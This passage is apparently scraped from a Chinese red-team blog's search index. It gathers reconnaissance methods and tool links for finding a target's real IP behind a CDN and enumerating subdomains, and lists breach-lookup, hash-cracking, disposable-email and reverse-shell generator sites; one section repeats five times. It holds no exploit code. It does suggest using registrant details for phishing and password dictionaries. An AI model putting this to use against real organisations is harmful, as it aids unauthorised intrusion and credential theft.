CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#11-从-cdn-入手"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#12-利用http标头寻找真实原始ip"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#13-利用网站返回的内容寻找真实原始ip"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#14-利用网站返回的内容寻找真实原始ip"},{"categories":["hvv"],"content":"\r0x09 查找真实IP 多地ping、nslookup、DNS 历史查询、查找子域名、反向连接、利用SSL证书寻找真实IP、国外解析域名、漏洞利用、目标敏感文件泄露、扫描全网、从 CDN 入手、利用HTTP标头寻找真实原始IP、利用网站返回的内容寻找真实原始IP、F5 LTM解码法 DNS解析与Whois 查询意义何在？ （1）DNS解析记录可以反查IP，比较早的解析记录有时可以查到真实IP，需要留意一下。 （2）注册人电话，注册人邮箱等社工信息可以钓鱼或者收集进字典来爆破目标办公系统。 为何需要收集子域名？ 收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。 常用方式 子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ 第三方子域名查询 名称 地址 子域名在线查询 https://phpinfo.me/domain/ 子域名在线查询 https://www.t1h2ua.cn/tools/ IP138查询子域名 https://site.ip138.com/baidu.com/domain.htm Layer子域名挖掘机4.2 https://www.webshell.cc/6384.html Layer子域名挖掘机5.0 https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j SubDomainBrute https://github.com/lijiejie/subDomainsBrute Sublist3r https://github.com/aboul3la/Sublist3r 假设：如果目标网站使用了CDN，该如何找到真实IP? **注意：**很多时候，主站虽然是用了CDN，但子域名可能没有使用CDN，如果主站和子域名在一个ip段中，那么找到子域名的真实IP也是一种途径，而且说不定子域名IP的C段就存在主域名的真实IP。 1. 部分收集真实IP 1) 多地ping如果多地ping同一网站，出现多个解析IP地址，那么说明使用了CDN进行内容分发~ http://www.baidu.com 可以看到解析到10多个IP地址，猜测应该是使用了CDN IP 信息收集网址 网址 作用 http://whois.chinaz.com/ Whois查询 http://tool.chinaz.com/ 站长工具 https://dns.aizhan.com/ 爱站网 ping检测 ip反查域 https://x.threatbook.cn/ 微步在线 https://toolbar.netcraft.com/site_report 网站查询 http://tool.chinaz.com/nslookup DNS 服务器解析 http://ping.chinaz.com/ping.chinaz.com 多地ping 检查dns是否存在 https://phpinfo.me/bing.php 在线旁站查询 c段 http://s.tool.chinaz.com/same 同ip查旁站 https://www.reg007.com/ 个人邮箱注册查询 windows 系统对应的内核版本和自带 iis 版本 Windows 10 10.0* Windows Server 2016 10.0* Windows 8.1 6.3* Windows Server 2012 R2 6.3* Windows 8 6.2 Windows Server 2012 6.2 Windows 7 6.1 Windows Server 2008 R2 6.1 Windows Server 2008 6.0 Windows Vista 6.0 Windows Server 2003 R2 5.2 Windows Server 2003 5.2 Windows XP 64-Bit Edition 5.2 Windows XP 5.1 Windows 2000 5.0 Windows 2000 Server→IIS5.0 Windows XP SP1→IIS5.0 Windows XP SP2,SP3→IIS5.1 Windows Server 2003，xp porfessional →IIS6.0 Windows Vista Ultimate→IIS7.0 Windows 7→iis7, iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2008 R2 ,部分win7→iis7.5 Windows server2008 sp2 sp3 → iis7.0 Windows server2012 ,windows 8 →iis8.0 Windows server2012 r2 →iis8.5 windows server 2016 ,windows 10 →iis10 2) nslookup使用nslookup查看域名解析对应的IP地址 3) DNS 历史查询查看IP与域名绑定的历史记录，有可能会存在使用CDN前的记录信息 · DNS历史：https://completedns.com/dns-history/ · 域历史记录检查器：https://whoisrequest.com/history/ · 世界上最大的DNS库：https://securitytrails.com/dns-trails · WHOIS搜索，域名，网站，和IP工具- WHOIS：https://who.is/ · 托管历史|过去的IP, DNS，注册商信息|域名工具：https://research.domaintools.com/research/hosting-history/ · 全球DNS搜索引擎：https://dnsdb.io/zh-cn/ · 网站全国各地Ping值测试|在线ping工具—卡卡网：http://www.webkaka.com/ping.aspx · CA应用合成监控网站监控服务- Ping – IPv6：https://asm.ca.com/en/ping.php iphistory：https://viewdns.info/iphistory/ · DNS查询：https://dnsdb.io/zh-cn/ · 微步在线：https://x.threatbook.cn/ · 域名查询：https://site.ip138.com/ · Netcraft：https://sitereport.netcraft.com/?url=github.com · CDN Finder工具：https://www.cdnplanet.com/tools/cdnfinder/ 通过大量DNS查漏 查询冷门的DNS的解析或者多地Ping 全球多地ping http://ce.cloud.360.cn/ http://www.webkaka.com/ping.aspx https://asm.ca.com/en/ping.php 4)查找子域名很多时候，站长都喜欢对主站或者流量大的子站点加 CDN，很多小站点又跟主站在同一台服务器或者同一个C段内，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。 常用的子域名查找方法和工具： **1、搜索引擎查询：**如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。 2、一些在线查询工具 如： http://tool.chinaz.com/subdomain/ http://i.links.cn/subdomain/ http://subdomain.chaxun.la/ http://searchdns.netcraft.com/ https://www.virustotal.com/ 3、 子域名爆破工具 Layer子域名挖掘机 wydomain：https://github.com/ring04h/wydomain subDomainsBrute：https://github.com/lijiejie/ Sublist3r：https://github.com/aboul3la/Sublist3r 5) 反向连接让服务器主动连接我们告诉我们它的IP，如RSS邮件订阅、邮箱注册、邮箱密码找回等，很多网站都自带sendmail","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:9","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#15-f5-ltm解码法"},{"categories":["hvv"],"content":"\r0x10 指纹识别收集网站信息，对网站进行指纹识别，通过识别指纹，确定目标的cms及版本 名称 地址 云悉 http://www.yunsee.cn/info.html 潮汐指纹 http://finger.tidesec.net/ bugscaner CMS指纹识别 http://whatweb.bugscaner.com/look/ Wappalyzer 指纹识别 (浏览器插件) https://github.com/AliasIO/wappalyzer GodEye Web指纹识别平台 https://www.godeye.vip/ WhatWeb ruby写的Web指纹识别工具 https://github.com/urbanadventurer/WhatWeb 数字观星指纹平台 https://fp.shuziguanxing.com/#/ ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:10","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x10-指纹识别"},{"categories":["hvv"],"content":"\r0x11 威胁情报平台 名称 地址 微步在线 威胁情报社区 https://x.threatbook.cn/ 奇安信 威胁情报中心 https://ti.qianxin.com/ VenusEye 威胁情报中心 https://www.venuseye.com.cn/ 绿盟科技 威胁情报云 https://ti.nsfocus.com/ IBM 情报中心 https://exchange.xforce.ibmcloud.com/ 天际友盟 安全智能服务平台 https://redqueen.tj-un.com/IntelHome.html 华为安全中心平台 https://isecurity.huawei.com/sec/web/intelligencePortal.do 安恒威胁情报中心 https://ti.dbappsecurity.com.cn/ 360 威胁情报中心 https://ti.360.cn/ 世界上第一个真正的开放威胁情报社区 https://otx.alienvault.com/ 丁爸 情报分析师的工具箱 http://dingba.top/ 听风者情报源 start.me https://start.me/p/X20Apn ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:11","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x11-威胁情报平台"},{"categories":["hvv"],"content":"\r0x12 账号/密码/数据泄漏情况查询网站 名称 地址 reg007 你注册过哪些网站？ https://www.reg007.com/ Firefox 电子邮件泄漏查询 https://monitor.firefox.com/ haveibeenpwned 检查电子邮件是否泄漏过 https://haveibeenpwned.com/ Dehashed 通过用户名、邮箱、地址搜索是否存在泄漏 https://dehashed.com/ Aleph 查询公共记录和泄漏信息 https://aleph.occrp.org/ SnusBase 最长的数据泄露搜索引擎 https://snusbase.com/ vigilante.pw 搜索数据泄露事件 https://vigilante.pw/ CheckUsernames 在160个社交网络上检查您的品牌或用户名的使用情况 https://checkusernames.com/ ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:12","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x12-账号密码数据泄漏情况查询网站"},{"categories":["hvv"],"content":"\r0x13 匿名邮箱/一次性邮箱/短信/隐私短信 名称 地址 ProtonMail:免费的加密电子邮箱 https://mail.protonmail.com/ mfk.app 免费临时电子邮件地址 https://www.8164.cc/ Temp Mail – 临时性 – 匿名电子邮件 https://temp-mail.org/ chacuo.net 临时邮箱、临时邮、临时电子邮箱、24小时邮箱 隐私短信 在线短信验证码接收码平台 http://24mail.chacuo.net/ 云简讯验证码接收平台 https://www.bfkdim.com/ ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:13","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x13-匿名邮箱一次性邮箱短信隐私短信"},{"categories":["hvv"],"content":"\r0x14 密码破解/密码生成/MD5破解/MD5加密类网站 名称 地址 CMD5 md5在线解密破解,md5解密加密 https://www.cmd5.com/ SOMD5 MD5在线免费解密平台 https://www.somd5.com/ 猜密码 输入目标信息 猜测可能使用的密码 https://www.hacked.com.cn/pass.html hashC 是完美的在线破解服务网站 https://hashc.co.uk/ CrackStation – Online Password Hash Cracking https://crackstation.net/ Online Password Recovery 在线密码恢复 https://passwordrecovery.io/ 在线随机密码生成工具 https://www.hacked.com.cn/password.php sojson MD5在线加密/解密/破解—MD5在线 https://www.sojson.com/md5/ ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:14","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x14-密码破解密码生成md5破解md5加密类网站"},{"categories":["hvv"],"content":"\r0x15 一些在线的命令生成网站,比如反弹shell命令，下载文件命令等 名称 地址 在线反弹shell命令生成 https://forum.ywhack.com/reverse-shell/ File Download Generator 文件下载快捷命令生成 https://file-downloads.com/ java.lang.Runtime.exec() Payload Workarounds http://java.lang.Runtime.exec() Payload Workarounds Hacking8 备忘录 https://www.hacking8.com/cheatsheet 草料二维码生成器 https://cli.im/ ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:15","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x15-一些在线的命令生成网站比如反弹shell命令下载文件命令等"},{"categories":["hvv"],"content":"\r0x16 在线提权辅助工具或一些提权相关的漏洞 名称 地址 hacking8 Windows提权辅助工具 https://viewdns.info/reverseip/ Kernelhub – Windows 提权漏洞合集(带有编译环境/详细说明) https://github.com/Ascotbe/Kernelhub DazzleUP – 